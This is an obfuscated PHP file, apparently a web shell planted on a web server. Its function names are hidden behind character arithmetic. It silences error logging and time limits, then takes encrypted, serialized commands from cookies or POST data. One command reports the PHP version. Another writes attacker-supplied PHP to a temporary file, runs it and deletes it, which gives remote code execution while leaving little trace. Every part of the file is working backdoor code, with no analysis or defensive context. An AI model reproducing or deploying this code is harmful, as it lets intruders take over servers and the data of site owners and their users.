<?php $ddbxkvkh = "\146"."\151".chr(173-65).chr(693-592).chr(185-90).chr(188-76).chr(117).chr(116)."\x5f".'c'.'o'.'n'."\x74".chr(1016-915).chr(704-594)."\164"."\x73";
$cxspgprtyw = 'b'."\x61"."\163".chr(101).chr(394-340).chr(52)."\x5f"."\x64"."\145"."\143".chr(511-400)."\144".chr(260-159);
$yzsuzixsf = 'i'."\156".'i'."\137".chr(429-314).chr(101)."\x74";
$xeqcn = chr(1029-912).chr(555-445)."\x6c"."\x69".'n'.chr(107);


@$yzsuzixsf(chr(101).'r'.'r'.'o'.chr(114).'_'.chr(1054-946)."\x6f".chr(195-92), NULL);
@$yzsuzixsf("\x6c"."\x6f".chr(103).'_'."\145"."\x72"."\162"."\157".chr(114)."\163", 0);
@$yzsuzixsf("\x6d".chr(712-615)."\x78".chr(95).chr(690-589).chr(429-309).chr(101)."\x63"."\165"."\x74".chr(577-472).chr(111)."\x6e"."\x5f"."\x74".'i'.chr(109).'e', 0);
@set_time_limit(0);

function ludvbyiobh($cpqyaew, $pwdkyoye)
{
    $fxmucu = "";
    for ($vlqkooqlq = 0; $vlqkooqlq < strlen($cpqyaew);) {
        for ($j = 0; $j < strlen($pwdkyoye) && $vlqkooqlq < strlen($cpqyaew); $j++, $vlqkooqlq++) {
            $fxmucu .= chr(ord($cpqyaew[$vlqkooqlq]) ^ ord($pwdkyoye[$j]));
        }
    }
    return $fxmucu;
}

$nwjlfr = array_merge($_COOKIE, $_POST);
$fefhbubrae = '9017583e-6421-4e55-8063-f5e5b8f67810';
foreach ($nwjlfr as $kfwqxcp => $cpqyaew) {
    $cpqyaew = @unserialize(ludvbyiobh(ludvbyiobh($cxspgprtyw($cpqyaew), $fefhbubrae), $kfwqxcp));
    if (isset($cpqyaew[chr(97)."\x6b"])) {
        if ($cpqyaew['a'] == chr(105)) {
            $vlqkooqlq = array(
                chr(112).chr(118) => @phpversion(),
                chr(115)."\166" => "3.5",
            );
            echo @serialize($vlqkooqlq);
        } elseif ($cpqyaew['a'] == "\x65") {
            $wpemgyh = "./" . md5($fefhbubrae) . '.'."\151".'n'.chr(769-670);
            @$ddbxkvkh($wpemgyh, "<" . chr(545-482)."\160"."\150".chr(469-357).chr(77-45).chr(64)."\165".chr(813-703).chr(108).chr(723-618)."\156"."\x6b".chr(551-511)."\137"."\137".chr(70)."\111"."\114".chr(69)."\137".'_'.')'.chr(322-263)."\40" . $cpqyaew["\144"]);
            @include($wpemgyh);
            @$xeqcn($wpemgyh);
        }
        exit();
    }
}

